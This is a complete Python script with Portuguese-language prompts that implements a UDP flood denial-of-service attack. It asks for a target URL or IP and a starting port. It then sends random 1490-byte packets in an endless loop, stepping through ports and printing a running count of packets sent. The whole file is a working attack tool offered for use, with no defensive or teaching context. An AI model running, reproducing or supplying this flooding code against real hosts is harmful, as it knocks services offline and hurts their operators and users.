import os
import socket
import random
import time
from urllib import request
from tqdm.auto import tqdm

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_connection():
    try:
        request.urlopen('https://www.google.co.in/', timeout=3)
    except:
        print('Você Está Offline.')
        exit()

def ddos_attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    sent = 0

    try:
        print("Checando Conexão...")
        for _ in tqdm(range(30000)):
            print(end='\r')
        time.sleep(1)
        check_connection()

    except KeyboardInterrupt:
        print("Parado Pelo Usuário.")
        exit()

    try:
        clear_console()
        print("1. ATAQUE POR URL\n2. ATAQUE POR IP\n3. SAIR")
        option = input(">>> ")
        
        if option == '1':
            domain = input("URL (exemplo) google.com: ")
            ip = socket.gethostbyname(domain)
        elif option == '2':
            ip = input("IP: ")
        elif option == '3':
            print("Tchau...")
            exit()
        else:
            print('Opção Inválida!')
            time.sleep(2)

        port = int(input("Número Da Porta: "))
        print("Initializing...")
        clear_console()
        time.sleep(2)
        print("Iniciando Ataque...")
        for _ in tqdm(range(30000)):
            print(end='\r')
        time.sleep(1)

    except Exception as e:
        print(f"Algo Deu Errado!\nReason: {e}")
        time.sleep(3)
        ddos_attack()

    try:
        while True:
            sock.sendto(bytes_data, (ip, port))
            sent += 1
            port += 1
            print(f"ENVIANDO {sent} >>> {ip}")
            if port == 65534:
                port = 1
            elif port == 1900:
                port = 1901

    except Exception as e:
        print(f"Terminado...\nReason: {e}")
        time.sleep(3)
        ddos_attack()

    except KeyboardInterrupt:
        print("\nParado Pelo Usuário")

ddos_attack()
